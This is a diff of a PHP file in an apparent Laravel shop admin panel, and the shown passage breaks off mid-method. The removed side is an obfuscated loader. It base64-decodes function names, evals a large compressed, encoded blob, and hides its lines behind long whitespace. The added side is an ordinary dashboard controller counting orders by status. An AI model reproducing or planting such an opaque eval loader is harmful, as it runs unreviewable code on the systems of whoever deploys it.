@@ -1,208 +1,533 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\Admin;
+use App\BanglaToEnglishConverter;
+use App\Employee;
+use App\Manager;
+use App\Order;
+use App\WebSettings;
+use Carbon\Carbon;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Str;
+
+class AdminController extends Controller
+{
+    public function dashboard()
+    {
+
+        $top_cities = Order::whereNotNull('courier_city_id')->select('courier_city_id', DB::raw('count(*) as total'))
+            ->groupBy('courier_city_id')
+            ->orderBy('total', 'desc')
+            ->get();
+        // dd($top_cities);
+
+        //top sell item from order product table with quantity
+        $top_sell = DB::table('order_products')
+            ->select('product_id', DB::raw('sum(qty) as total'))
+            ->groupBy('product_id')
+            ->orderBy('total', 'desc')
+            ->limit(5)
+            ->get();
+
+        // dd($top_sell);
+        if (Auth::guard('admin')->check() || Auth::guard('manager')->check()) {
+            $data['total_revenue'] = DB::table('orders')->where('status', 1)->sum('total');
+            $data['total_customer'] = DB::table('users')->count();
+            $data['total_product'] = DB::table('products')->count();
+            $data['employees'] = DB::table('employees')->select('id', 'name', 'status', 'last_seen', 'last_login_ip')->whereNotNull('last_seen')->where('status', 1)->get();
+            $data['admins'] = DB::table('admins')->select('id', 'name', 'status', 'last_seen', 'last_login_ip')->whereNotNull('last_seen')->where([['status', 1], ['id', '!=', 1]])->get();
+            $data['managers'] = DB::table('managers')->select('id', 'name', 'status', 'last_seen', 'last_login_ip')->whereNotNull('last_seen')->where('status', 1)->get();
+
+            if (Auth::guard('admin')->check()) {
+                $data['total_staff'] = (DB::table('admins')->count() + DB::table('employees')->count() + DB::table('managers')->count() - 1);
+            } elseif (Auth::guard('manager')->check()) {
+                $data['total_staff'] = (DB::table('employees')->count() + DB::table('managers')->count() - 2);
+            }
+
+            $data['recent_orders'] = DB::table('orders')->select('id', 'order_date', 'customer_name', 'customer_phone', 'total', 'status')
+                ->orderBy('id', 'desc')
+                ->limit(10)
+                ->get();
+            $data['total_order'] = DB::table('orders')->where('deleted_at', null)->count();
+            $data['total_hold_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 0)->count();
+            $data['total_deliver_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 1)->count();
+            $data['total_process_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 2)->count();
+            $data['total_pend_pay_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 3)->count();
+            $data['total_cancel_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 4)->count();
+            $data['total_pending_invoice_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 5)->count();
+            $data['total_on_delivery_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 6)->count();
+            $data['total_pending_return_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 7)->count();
+            $data['total_courier_hold_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 8)->count();
+            $data['total_nr_1_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 9)->count();
+            $data['total_invoiced_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 10)->count();
+            $data['total_return_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 11)->count();
+            $data['total_incomplete_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 12)->count();
+            $data['total_confirmed_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 13)->count();
+            $data['total_stock_out_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 14)->count();
+            $data['total_partial_delivery_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 15)->count();
+            $data['total_lost_order'] = DB::table('orders')->where('deleted_at', null)->where('status', 16)->count();
+
+            $data['today_all_orders'] = DB::table('orders')->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_hold_orders'] = DB::table('orders')->where('status', 0)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_deliver_orders'] = DB::table('orders')->where('status', 1)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_process_orders'] = DB::table('orders')->where('status', 2)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_pend_pay_orders'] = DB::table('orders')->where('status', 3)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_cancel_orders'] = DB::table('orders')->where('status', 4)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_pending_invoice_orders'] = DB::table('orders')->where('status', 5)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_on_delivery_orders'] = DB::table('orders')->where('status', 6)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_pending_return_orders'] = DB::table('orders')->where('status', 7)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_courier_hold_orders'] = DB::table('orders')->where('status', 8)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_nr_1_orders'] = DB::table('orders')->where('status', 9)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_invoiced_orders'] = DB::table('orders')->where('status', 10)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_return_orders'] = DB::table('orders')->where('status', 11)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_incomplete_orders'] = DB::table('orders')->where('deleted_at', null)->where('status', 12)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_confirmed_orders'] = DB::table('orders')->where('deleted_at', null)->where('status', 13)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_stock_out_orders'] = DB::table('orders')->where('status', 14)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_partial_delivery_orders'] = DB::table('orders')->where('status', 15)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+            $data['today_lost_orders'] = DB::table('orders')->where('status', 16)
+                ->whereDate('order_date', Carbon::today())
+                ->count();
+
+
+        } elseif (Auth::guard('employee')->check()) {
+            //$data['recent_orders'] = OrderAssign::with('get_order')->where('employee_id', Auth::guard('employee')->id())->orderBy('id', 'desc')->limit(10)->get();
+            /*$data['recent_orders'] = Order::whereHas('get_assigned',function ($q){
+            $q->where('employee_id',Auth::guard('employee')->id());
+            })->orderBy('id', 'desc')->limit(10)->get();*/
+
+            $data['recent_orders'] = DB::table('orders')
+                ->leftJoin('order_assigns', 'order_assigns.order_id', 'orders.id')
+                ->select('orders.id', 'orders.order_date', 'orders.customer_name', 'orders.customer_phone', 'orders.total', 'orders.status')
+                ->where('order_assigns.employee_id', Auth::guard('employee')->id())
+                ->orderBy('orders.id', 'desc')->limit(10)->get();
+
+            $data['total_order'] = DB::table('order_assigns')
+                ->where('employee_id', Auth::guard('employee')->id())
+                ->count();
+            $data['total_hold_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 0]])
+                ->count();
+            $data['total_deliver_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 1]])
+                ->count();
+            $data['total_process_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 2]])
+                ->count();
+            $data['total_pend_pay_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 3]])
+                ->count();
+            $data['total_cancel_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 4]])
+                ->count();
+            $data['total_pending_invoice_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 5]])
+                ->count();
+            $data['total_on_delivery_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 6]])
+                ->count();
+            $data['total_pending_return_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 7]])
+                ->count();
+            $data['total_courier_hold_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 8]])
+                ->count();
+            $data['total_nr_1_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 9]])
+                ->count();
+            $data['total_invoiced_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 10]])
+                ->count();
+
+            $data['total_return_order'] = DB::table('order_assigns')
